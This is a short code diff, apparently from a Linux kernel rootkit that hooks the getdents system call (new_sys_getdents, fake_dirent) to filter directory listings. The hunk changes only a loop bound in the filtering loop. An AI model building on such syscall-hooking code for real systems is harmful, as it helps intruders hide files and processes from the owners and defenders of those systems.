@@ -329,7 +329,7 @@ asmlinkage long new_sys_getdents(unsigned int fd,
     }
        
     new_size = size; 
-    for (bpos = 0; bpos < size;)
+    for (bpos = 0; bpos < new_size;)
     {
     	d = (struct linux_dirent *)((char *)fake_dirent + bpos);
     	if (d->d_ino != 0)
